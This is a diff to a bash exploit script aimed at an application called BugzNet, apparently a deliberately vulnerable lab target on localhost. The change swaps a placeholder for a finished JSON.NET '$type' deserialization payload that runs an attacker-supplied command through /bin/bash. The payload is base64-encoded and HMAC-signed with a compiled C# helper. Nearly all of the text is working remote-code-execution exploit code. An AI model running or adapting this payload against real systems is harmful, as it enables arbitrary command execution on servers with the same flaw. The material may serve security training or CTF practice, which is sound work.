@@ -1,9 +1,9 @@
 #!/bin/bash
 
 
-if [[ $# -lt 3 ]]
+if [[ $# -lt 4 ]]
 then
-    echo "USAGE: $0 <username> <password> <hmac_secret>"
+    echo "USAGE: $0 <username> <password> <hmac_secret> <cmd>"
     exit 1
 fi
 
@@ -11,7 +11,8 @@ rhost="http://localhost"
 username=$1
 password=$2
 secret=$3
-cookieJar=mktemp
+cmd=$4
+cookieJar=`mktemp`
 
 crypto="
 using System;
@@ -34,7 +35,10 @@ namespace crypto
 echo $crypto > crypto.cs
 mcs -out:crypto.exe crypto.cs
 
-payload="{}" # <-- put ysoserial payload here
+payload="{"
+payload+="'\$type':'BugzNet.Infrastructure.Configuration.CSharpScriptExpression, BugzNet.Infrastructure, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null',"
+payload+="'Expression':'() => System.Diagnostics.Process.Start(\"/bin/bash\", \"-c \\\\\"$cmd\\\\\"\") == null'"
+payload+="}"
 
 payload=$(echo -n $payload | base64 | tr -d '\n')
 signature=$(mono crypto.exe "$secret" "$payload")
